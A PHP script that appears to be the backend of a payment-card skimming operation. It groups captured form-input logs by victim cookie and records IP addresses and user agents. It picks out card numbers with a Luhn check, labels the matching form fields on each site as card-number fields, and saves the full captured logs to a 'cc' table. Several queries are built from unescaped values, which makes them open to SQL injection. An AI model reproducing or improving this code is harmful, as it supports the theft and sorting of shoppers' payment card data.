<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function luhnCheck($number) {
    $number = str_replace(' ', '', $number);
    $sum = 0;
    $numDigits = strlen($number);
    $parity = $numDigits % 2;

    for ($i = 0; $i < $numDigits; $i++) {
        $digit = $number[$i];
        if ($i % 2 == $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return ($sum % 10) == 0;
}

function findCreditCardNumbers($dataLog) {
    $cardNumbers = [];
    $dataLog = trim($dataLog, '[]');
    $dataLog = str_replace('"', '', $dataLog);
    $items = explode(',', $dataLog);

    foreach ($items as $item) {
        $pos = strpos($item, ':');
        if ($pos !== false) {
            $key = substr($item, 0, $pos);
            $value = substr($item, $pos + 1);
            $cleanedValue = preg_replace('/\D/', '', $value);
            if (preg_match('/^\d{15,19}$/', $cleanedValue)) {
                if (luhnCheck($cleanedValue)) {
                    $cardNumbers[$key] = $value;
                }
            }
        }
    }
    return $cardNumbers;
}

require 'config.php';

$query = "SELECT * FROM full_log";
$result = $db->query($query);

$dataByUsers = [];
while ($row = $result->fetch_assoc()) {
    $dataByUsers[$row['user_cookie']][] = $row;
}

foreach ($dataByUsers as $userCookie => $records) {
    $fullLogId = $records[0]['id'];
    $urlId = $records[0]['referrer'];
    $ip = $records[0]['ip_address'];
    $ua = $records[0]['useragent'];
    
    $fullDataLog = array_column($records, 'data');
    $fullDataLogString = implode(",", $fullDataLog);
    $fullDataLogStringEscaped = $db->real_escape_string($fullDataLogString);
    
    $cardData = findCreditCardNumbers($fullDataLogStringEscaped);
    
    if (!empty($cardData)) {
        foreach ($cardData as $fieldKey => $cardNumber) {
            $fieldKey = trim($fieldKey);
            $fieldKey = preg_replace('/[^a-zA-Z0-9_\-[\].$]/', '', $fieldKey);
            $fieldKey = $db->real_escape_string($fieldKey);
            $checkMappingQuery = "SELECT * FROM field_mappings WHERE url_id = '$urlId' AND field_key = '$fieldKey'";
            $checkMappingResult = $db->query($checkMappingQuery);
            if ($checkMappingResult->num_rows == 0) {
                $db->query("INSERT INTO field_mappings (url_id, field_key, assign_as) VALUES ('$urlId', '$fieldKey', 'payment_cc_number')");
            }
        }
    }

    $hash = md5($fullDataLogString);
    $existingHashQuery = "SELECT hash FROM cc WHERE id = '$fullLogId'";
    $existingHashResult = $db->query($existingHashQuery);
    
    if ($existingHashResult->num_rows > 0) {
        $existingHash = $existingHashResult->fetch_assoc()['hash'];
        if ($existingHash == $hash) {
            continue;
        }
    }

    $insertOrUpdateQuery = "INSERT INTO cc (id, uniquecookies, fulldatalog, url_id, ip, ua, hash) VALUES ('$fullLogId', '$userCookie', '$fullDataLogStringEscaped', '$urlId', '$ip', '$ua', '$hash') ON DUPLICATE KEY UPDATE fulldatalog = VALUES(fulldatalog), url_id = VALUES(url_id), ip = VALUES(ip), ua = VALUES(ua), id = VALUES(id), hash = VALUES(hash)";
    if (!$db->query($insertOrUpdateQuery)) {
        die("Ошибка выполнения запроса: " . $db->error);
    }
}

$db->close();
?>
